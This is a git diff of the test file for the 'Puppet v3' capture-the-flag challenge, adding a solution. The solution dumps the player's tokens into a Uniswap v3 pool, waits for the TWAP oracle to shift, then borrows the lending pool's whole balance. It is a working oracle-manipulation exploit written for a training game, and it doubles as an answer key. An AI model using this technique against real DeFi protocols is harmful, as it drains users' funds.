@@ -6,6 +6,8 @@ const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/N
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
 
+const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
+
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
 bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
@@ -140,6 +142,27 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const router = new ethers.Contract("0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", routerJson.abi, player);
+        await token.connect(player).approve(router.address, ethers.constants.MaxUint256);
+        await router.exactInputSingle(
+            [
+                token.address,
+                weth.address,
+                3000,
+                player.address,
+                PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
+                0,
+                0
+            ],
+            {
+                gasLimit: 1e7
+            }
+        );
+
+        await time.increase(100);
+
+        await weth.connect(player).approve(lendingPool.address, ethers.constants.MaxUint256);
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
